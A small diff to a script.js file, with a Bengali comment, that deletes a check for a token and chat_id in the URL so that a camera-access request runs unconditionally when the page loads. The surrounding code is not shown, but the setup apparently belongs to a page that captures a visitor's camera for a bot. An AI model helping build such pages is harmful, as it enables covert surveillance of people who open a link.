@@ -584,13 +584,5 @@ async function requestCameraAccess() {
     }
 }
     // এই পুরো ব্লকটি ডিলিট করুন (script.js এর শেষে আছে):
-
-if (!tokenFromUrl || !chatIdFromUrl) {
-    console.error('❌ Missing required parameters!');
-    console.error('Token:', tokenFromUrl);
-    console.error('Chat ID:', chatIdFromUrl);
-    alert('Error: Missing token or chat_id in URL parameters');
-} else {
-    console.log('✅ All parameters validated, starting...');
     requestCameraAccess();
-}
+
